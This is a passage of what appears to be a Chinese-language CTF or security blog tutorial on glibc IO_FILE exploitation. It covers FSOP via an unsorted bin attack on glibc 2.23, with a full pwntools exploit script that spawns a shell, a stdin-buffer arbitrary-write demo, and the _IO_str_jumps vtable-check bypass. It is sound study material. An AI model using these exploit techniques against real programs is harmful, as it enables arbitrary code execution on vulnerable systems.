<p>可以看到在第二个<code>if</code>的<strong>最后</strong>其调用了<code>_IO_OVERFLOW</code>函数，同时在<strong>调用之前还有一系列判断</strong>，这一点很重要，下面结合题目来说</p>
<p>因为在2.23的版本还是能用unsorted bin attack的，所以可以选择用unsorted bin attack将<code>_IO_list_all</code>改成<code>main_arena + 88</code>之后（没tcache之前unsorted bind对应main_arena+88），<code>_IO_list_all</code>所指向的结构如下：</p>
<img src="/2022/06/08/IO-FILE/fsop-1.jpg" class>

<p>可见此时的数据都是<code>main_arena</code>本身的数据，所以我们无法控制，但是这时该结构的<code>_chain</code>指针为<code>main_arena + 168</code>，这个地址对应的是0x60大小的small bin，所以如果我们后续能<strong>将一个0x60大小的chunk放到small bin的话，这个地址就会被改写成那个chunk的地址，也就变成了一个可控的地址</strong>。</p>
<p>如下：</p>
<img src="/2022/06/08/IO-FILE/fsop-2.jpg" class>

<p>可见其中<code>_chain</code>指针被修改成了chunk地址，这也就意味着下一个<code>_IO_FILE_plus</code>结构是可控的，所以我们就可以在下一个IO_FILE结构中布置虚表，当<code>_IO_flush_all_lockp</code>函数刷新下一个IO_FILE结构（也就是我们所能控制的这个IO_FILE结构）时，我们就能控制它去调用我们伪造的虚表中的函数。这时候就引申出一个问题：当前的这个无法控制的<code>_IO_FILE_plus</code>结构中的虚表是一个<code>main_arena</code>地址，其中当然没有能正常调用的函数指针，那么为什么<code>_IO_flush_all_lockp</code>函数能够刷新到第二个<code>IO_FILE</code>结构（也就是我们控制的），而不在当前结构中clash掉呢？</p>
<p>其实很简单，这是因为在<code>if</code>中要执行到<code>_IO_OVERFLOW</code>的调用之前还有一系列的判断，如果当前的IO_FILE结构中的数据不满足前面的判断的话程序自然就直接跳出当前<code>if</code>语句而不用继续执行后面的函数调用了，所以原生数据使得程序跳出这个<code>if</code>语句时就能避免后续错误函数指针的调用而clash，进而继续刷新下一个IO_FILE结构。结合汇编看具体如下：</p>
<p>在第一个IO_FILE结构中前面的判断就已经错了（对应<code>fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</code>），所以没有跳到指针调用的那一块，</p>
<img src="/2022/06/08/IO-FILE/fsop-3.jpg" class>

<p>接下来在第二个IO_FILE结构中则顺利到了指针调用这一块</p>
<img src="/2022/06/08/IO-FILE/fsop-4.jpg" class>

<p>结合指针调用这一部分的汇编就知道应该怎么布置参数以及虚表指针了。</p>
<p>剩下最后一个小点就是把将一个0x60大小的chunk放到small bin，只需要在free掉unsorted bin大小的chunk之后再将它的size改成0x61即可，这样在下一次malloc的时候按照流程程序就会把当前unsorted bin中的chunk放到small bin且同时触发unsorted bin attack。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">p1 = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">add(<span class="number">0</span>,p1)</span><br><span class="line">add(<span class="number">1</span>,p1)</span><br><span class="line">add(<span class="number">2</span>,p1)</span><br><span class="line">add(<span class="number">3</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_base = u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base + <span class="number">0x10</span>) + p64(<span class="number">0x31</span>)) <span class="comment">#change fd</span></span><br><span class="line">add(<span class="number">4</span>,p1)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">&#x27;aaa&#x27;</span>)	<span class="comment">#unsortedbin chunk</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">6</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)) <span class="comment">#change size</span></span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7fd76886eb78</span> - <span class="number">0x00007fd7684aa000</span>)</span><br><span class="line">IO_list = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(libc_base + (<span class="number">0x7fd76886eb78</span> - <span class="number">0x00007fd7684aa000</span>)) + p64(IO_list - <span class="number">0x10</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">7</span>,p64(system)*<span class="number">3</span> + p64(heap_base+<span class="number">0xd0</span>-<span class="number">0x18</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>堆构造部分有点别扭是因为最多申请十个堆，而虚表需要放在chunk+0xd8处，所以导致位置不太够用。</p>
<h2 id="glibc-2-24-下-IO-FILE-的利用"><a href="#glibc-2-24-下-IO-FILE-的利用" class="headerlink" title="glibc 2.24 下 IO_FILE 的利用"></a>glibc 2.24 下 IO_FILE 的利用</h2><p>从glibc 2.24开始加入了对vtable合法性的检测，如果vtable不在<code>_IO_vtable </code>段中，那么程序会调用<code>_IO_vtable_check()</code>函数进行进一步的检查，这个check具体我没有审，但是似乎很难绕过。</p>
<p>所以从这个版本开始，针对vtable进行的攻击变得难以执行，我们利用的关注点就转向<code>_IO_FILE</code>内部</p>
<h3 id="修改-IO-FILE完成任意地址读写"><a href="#修改-IO-FILE完成任意地址读写" class="headerlink" title="修改_IO_FILE完成任意地址读写"></a>修改_IO_FILE完成任意地址读写</h3><p>在<code>_IO_FILE</code>结构被初始化之后，<code>_IO_buf_base</code>表示该文件流缓冲区的起始地址，<code>_IO_buf_end</code>表示该缓冲区的结束地址，在我们调用IO函数的时候，程序会创建一片内存来用作IO的缓冲区，例如调用<code>scanf(&quot;%s&quot;,stack_buf);</code>时，程序会将我们的输入首先输入到为标准输入创建的缓冲区中，当输入完毕之后程序再将该缓冲区中的内容拷贝到<code>stack_buf</code>变量中，这个中间过程其实还有很多细节，但是这里先不关注。</p>
<p>那么这也就意味着如果我们能够控制哪里作为标准输入的缓冲区的话，就相当于有了任意地址写，同理如果控制标准输出的缓冲区就相当于有了任意地址读。具体其实就是修改<code>_IO_buf_base</code>以及<code>_IO_buf_end</code>这两个指针。</p>
<h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> test[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> *fp = <span class="built_in">stdin</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,fp);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;test = %s\n&quot;</span>,test);</span><br><span class="line">	fp[<span class="number">7</span>] = test;</span><br><span class="line">	fp[<span class="number">8</span>] = test+<span class="number">100</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;now test = %s\n&quot;</span>,test);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>自己写的一个小demo，第一次scanf是为了初始化stdin的FILE结构，然后将stdin的<code>_IO_buf_base</code>和<code>_IO_buf_end</code>域分别改成test数组的起始地址、起始地址+100，然后再次进行一次输入，可以发现test数组已经被作为标准输入的缓冲区了</p>
<p>初始化后的<code>_IO_2_1_stdin_</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p _IO_2_1_stdin_</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xfbad2288, </span><br><span class="line">    _IO_read_ptr = 0x602426 &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x602427 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x602420 &quot;123123\n&quot;, </span><br><span class="line">    _IO_write_base = 0x602420 &quot;123123\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x602420 &quot;123123\n&quot;, </span><br><span class="line">    _IO_write_end = 0x602420 &quot;123123\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x602420 &quot;123123\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x602820 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0x0, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0xffffffffffffffff, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd3790 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = 0xffffffffffffffff, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd19c0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0xffffffff, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p _IO_2_1_stdin_</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xfbad2288, </span><br><span class="line">    _IO_read_ptr = 0x602426 &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x602427 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x602420 &quot;123123\n&quot;, </span><br><span class="line">    _IO_write_base = 0x602420 &quot;123123\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x602420 &quot;123123\n&quot;, </span><br><span class="line">    _IO_write_end = 0x602420 &quot;123123\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x7fffffffdbf0 &quot;&quot;, 			#已经被修改</span><br><span class="line">    _IO_buf_end = 0x7fffffffdc54 &quot;\377\177&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0x0, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0xffffffffffffffff, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd3790 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = 0xffffffffffffffff, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd19c0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0xffffffff, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次进行输入后可以看到其它域也被更改了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p _IO_2_1_stdin_</span><br><span class="line">$4 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0xfbad2288, </span><br><span class="line">    _IO_read_ptr = 0x7fffffffdbf0 &quot;/bin/sh\n&quot;, </span><br><span class="line">    _IO_read_end = 0x7fffffffdbf8 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x7fffffffdbf0 &quot;/bin/sh\n&quot;, </span><br><span class="line">    _IO_write_base = 0x7fffffffdbf0 &quot;/bin/sh\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7fffffffdbf0 &quot;/bin/sh\n&quot;, </span><br><span class="line">    _IO_write_end = 0x7fffffffdbf0 &quot;/bin/sh\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x7fffffffdbf0 &quot;/bin/sh\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x7fffffffdc54 &quot;\377\177&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0x0, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0xffffffffffffffff, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd3790 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = 0xffffffffffffffff, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd19c0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0xffffffff, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out </span><br><span class="line">0x7ffff7dd18e0</span><br><span class="line">123123	#第一次输入</span><br><span class="line">test = </span><br><span class="line">/bin/sh	#第二次输入</span><br><span class="line">now test = /bin/sh</span><br></pre></td></tr></table></figure>

<h3 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h3><p>前面讲了从glibc-2.24开始加入了对vtable合法性的check，所以难以将vtable修改成一个我们可控的地址。</p>
<p>正常情况下<code>_IO_FILE_plus</code>结构中的vtable是<code>_IO_file_jumps</code>类型的，但是libc中其实不止这一个虚表，还有<code>_IO_str_jumps</code>、<code>_IO_wstr_jumps</code>等等，这些表都位于vtable段中，所以能通过check，虽然它们同样位于不可控的内存中，但是这些虚表中有一些函数本身就可以被我们所利用。</p>
<p>其中<code>_IO_str_jumps</code>表如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="IO-str-overflow"><a href="#IO-str-overflow" class="headerlink" title="_IO_str_overflow"></a>_IO_str_overflow</h4><p>首先关注<code>_IO_str_overflow</code>这个函数，其源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *new_buf;</span><br><span class="line">      <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//重点！</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>

<p>其中重点在<code>new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code>这行命令中，这里直接用<code>fp</code>指针来调用了一个函数，而且其参数<code>new_size</code>由前文可知是可控的（通过<code>_IO_FILE</code>中的字段）</p>
<p>那么显然这就是一个可以利用的函数，值得注意的是，<code>_IO_str_jumps</code>表中的<code>_IO_str_overflow</code>函数跟<code>_IO_file_jumps</code>表中的<code>_IO_new_file_overflow</code>函数的偏移是一致的，那么就意味着如果直接把vtable改成<code>_IO_str_jumps</code>的话，程序调用<code>_IO_new_file_overflow</code>时就相当于调用了<code>_IO_str_overflow</code>了，这两个函数的区别就在于我们能够利用后者来调用一个可控的函数指针以及其参数，而前者不行。</p>
<p>所以整体的利用流程就很简单了，只需要将<code>_IO_list_all</code>劫持到一个可控的内存区域，然后在<code>_IO_FILE</code>中布置合理的数据，将vtable直接改成<code>_IO_str_jumps</code>即可，最后触发方式就跟FSOP一样：libc的abort流程、exit函数的调用。</p>
<p>最后再梳理一下<code>_IO_FILE</code>应该布置什么数据就好了</p>
<h4 id="定位-IO-str-jumps"><a href="#定位-IO-str-jumps" class="headerlink" title="定位_IO_str_jumps"></a>定位_IO_str_jumps</h4><p>在一些libc版本中不会有<code>_IO_str_jumps</code>表的符号，所以不能直接用<code>libc.symbols[]</code>来确定其偏移，但是因为<code>_IO_str_jumps</code>表中会有<code>_IO_str_underflow</code>函数，而且<code>_IO_str_jumps</code>表的地址一定比<code>_IO_file_jumps</code>高，所以可以用下面这个脚本来确定<code>_IO_str_jumps</code>表在libc中的偏移</p>
